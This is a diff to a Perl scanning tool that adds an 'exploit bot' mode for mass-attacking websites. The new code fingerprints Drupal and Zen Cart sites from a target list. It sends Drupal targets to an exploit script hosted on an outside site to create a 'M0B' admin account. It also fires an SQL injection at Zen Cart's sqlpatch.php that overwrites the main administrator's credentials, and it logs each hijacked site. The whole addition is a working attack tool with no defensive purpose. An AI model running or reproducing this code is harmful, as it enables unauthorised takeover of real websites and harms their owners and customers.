@@ -55,6 +55,14 @@ $result="result";
     {
         mkdir $result or die "Error creating directory: $result";
     }
+	$rez="rez";
+    if (-e $rez) 
+    {
+    }
+    else
+    {
+        mkdir $rez or die "Error creating directory: $rez";
+    }
 	
 $cms="cms";
     if (-e $cms) 
@@ -124,6 +132,9 @@ if ( @uname =~ Linux ) {    #for linux os
 	print "-------------+-------------------------------------------------------------\n";
 	print "-------------+-------------------------------------------------------------\n";
 	print " --portscan  |scan a ip ports.\n";
+	print "-------------+-------------------------------------------------------------\n";
+	print "-------------+-------------------------------------------------------------\n";
+	print " --ex        |exploit bot [DRUPAL - ZENCART] [MORE COMING SOON]\n";
 	print "---------------------------------------------------------------------------\n";
 	exit();
 }
@@ -252,6 +263,7 @@ $att="q=|0day|pastebin|\/\/t.co|google.|youtube.|jsuol.com|.radio.uol.|b.uol.|ba
      if ($ARGV[$i] eq "--scan"){$search_scan = $ARGV[$i+1]}
      if ($ARGV[$i] eq "--sql"){$search_sql = $ARGV[$i+1]}
      if ($ARGV[$i] eq "--portscan"){$ip_scan = $ARGV[$i+1]}
+     if ($ARGV[$i] eq "--ex"){$ex_list = $ARGV[$i+1]}
 	 if ($ARGV[$i] eq "--help"){$help = &help}
      $i++;
 	 }
@@ -1130,3 +1142,123 @@ print "You are leaveing the port scan\n\n";
 exit;
 }
 }
+##############################
+########## EXPLOIT ###########
+##############################
+	 if (defined($ex_list))
+{
+     print "[+] SCANNING SITES\n" ;
+     print "[+] LIST TO SCAN : $ex_list\n\n\n" ;
+ex();
+}
+
+sub ex {
+open (ex_list, "<$ex_list") || die "\n [LIST NOT FOUND]";
+my @ex_list = <ex_list>;
+close ex_list;
+ 
+foreach $site(@ex_list) {
+ 
+if($site !~ /http:\/\//) { $site = "http://$site/"; };
+exdetect();
+}
+}
+
+sub exdetect {
+my $check = $ag1->get("$site")->content;
+my $V_ZC=("all rights reserved Zen Cart|<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart");
+my $V_DRP=("name=\"Generator\" content=\"Drupal|Drupal|drupal|sites\/all|drupal.org/");
+my $V_WP=("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress|<meta name=\"generator\" content=\"WordPress|\/wp-content\/(.*).js");
+my $V_JOOM=("<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!");
+my $V_XSS=("You have an error in your SQL|Warning: mysql_|function.mysql|MySQL result index|MySQL Error|MySQL ODBC|MySQL Driver|mysqli.query|num_rows|mysql error:",
+           "supplied argument is not a valid MySQL result resource|on MySQL result index|Error Executing Database Query|mysql_fetch_|The used SELECT statements have a different number of columns|SQL query failed|mysql_");
+if($check =~/$V_ZC/) {
+    print colored("[ZEN CART]: $site",'blue'),"\n";
+open(save, '>>cms/zencart.txt');
+    print save "$site";
+    close(save);
+zencart();
+}
+elsif($check =~/$V_DRP/) {
+    print colored("[DRUPAL]: $site",'blue'),"\n";
+open(save, '>>cms/drupal.txt');
+    print save "$site";
+    close(save);
+drupal();
+}
+else{
+   print colored("[UNKNOWN]: $site",'BOLD WHITE'),"\n";
+   open(save, '>>cms/UNKNOWN.txt');
+   print save "$site";
+   close(save);
+}
+}
+
+sub drupal {
+
+$drupalink = "http://phuongnammobile.vn/drupal.php"; # make sure to check link if it still work , if its not upload it yourself [ you can do it with wampp ( windows ) or with apache2 ( linux ) ]
+my $exploit = "$drupalink?url=$site&submit=submit";
+$admin ="M0B";
+$pass  ="M0B";
+$dr = $site . '/user/login';
+$red = $site . '/user/1';
+my $checkk = $ag1->get("$exploit")->content;
+if($checkk =~/Success!/) {
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Drupal Add Admin";
+print color('bold green'),"[VULN]\n\n";
+print color('bold green')," [";
+print color('bold red'),"+";
+print color('bold green'),"] ";
+print color('bold white'),"URL : $dr\n";
+print color('bold white'),"USER : $admin\n";
+print color('bold white'),"PASS : $pass\n";
+open (TEXT, '>>rez/drupal.txt');
+print TEXT "\nURL : $dr\n";
+print TEXT "USER : $admin\n";
+print TEXT "PASS : $pass\n\n";
+close (TEXT);
+}else{
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Drupal Add Admin";
+print color('bold red'),"[FAILED]\n\n";
+}
+}
+
+sub zencart {
+$target = $site;
+$target = "$site";
+my $re = &exploit($target);
+
+if ($re =~ /1 statements processed/i){
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"ZEN CART Add Admin";
+print color('bold green'),"[VULN]\n\n";
+open (TEXT, '>>rez/zencart.txt');
+print TEXT "\nURL : $target\n";
+print TEXT "USER : admincrash\n";
+print TEXT "PASS : wew\n";
+}
+else{
+print color('bold red'),"[";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"ZEN CART Add Admin";
+print color('bold red'),"[FAILED]\n\n";
+}
+}
+sub exploit(){
+$url = $_[0];
+my $browser = LWP::UserAgent->new();
+my $responde = HTTP::Request->new(POST => $url."/admin/sqlpatch.php/password_forgotten.php?action=execute");
+$responde->content_type("application/x-www-form-urlencoded");
+$responde->content("query_string=UPDATE admin SET admin_name='admincrash', admin_email='admin@shopadmin.com', admin_pass='617ec22fbb8f201c366e9848c0eb6925:87' WHERE admin_id='1';");
+$browser->request($responde)->as_string
+}
+
